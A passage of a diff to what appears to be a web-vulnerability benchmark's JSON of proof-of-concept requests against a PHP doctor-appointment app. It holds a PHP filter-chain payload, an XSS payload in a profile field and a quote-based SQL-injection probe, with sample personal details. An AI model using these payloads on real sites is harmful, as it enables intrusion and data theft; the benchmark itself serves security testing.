base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682734f221326",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_bdf20b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "NO 153 BLOK MURNI\r\nKOLEJ CANSELOR UNIVERSITI PUTRA MALAYSIA"
+      ],
+      "patientDOB": [
+        "1992-05-17"
+      ],
+      "patientEmail": [
+        "lan.psis@gmail.com"
+      ],
+      "patientFirstName": [
+        "Mohd"
+      ],
+      "patientGender": [
+        "male"
+      ],
+      "patientLastName": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "patientMaritialStatus": [
+        "single"
+      ],
+      "patientPhone": [
+        "173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {
+      "patientId": [
+        "123"
+      ]
+    },
+    "request_id": "requests.67dbd4edb52fc",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_d5a116",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "doctorappt",
+    "application_name": "Doctor Appointment Booking System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-doctorappt-v0.1.0",
+    "method": "POST",
+    "path": "/patient/profile.php",
+    "post_data": {
+      "patientAddress": [
+        "NO 153 BLOK MURNI\r\nKOLEJ CANSELOR UNIVERSITI PUTRA MALAYSIA"
+      ],
+      "patientDOB": [
+        "\""
+      ],
+      "patientEmail": [
+        "lan.psis@gmail.com"
+      ],
+      "patientFirstName": [
+        "Mohd"
+      ],
+      "patientGender": [
+        "male"
+      ],
+      "patientLastName": [
+        "Mazlan"
+      ],
+      "patientMaritialStatus": [
+        "single"
+      ],
+      "patientPhone": [
+        "173567758"
+      ],
+      "submit": [
+        "Update Info"
+      ]
+    },
+    "query_params": {
+      "patientId": [
+        "123"
+      ]
+    },
+    "request_id": "requests.67dbd4edafeb3",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://projectworlds.in/free-projects/php-projects/online-doctor-appointment-booking-system-php-and-mysql",
+    "vuln_id": "vuln_function_e61fb6",
+    "vuln_type": "sqli"
+  }
+]
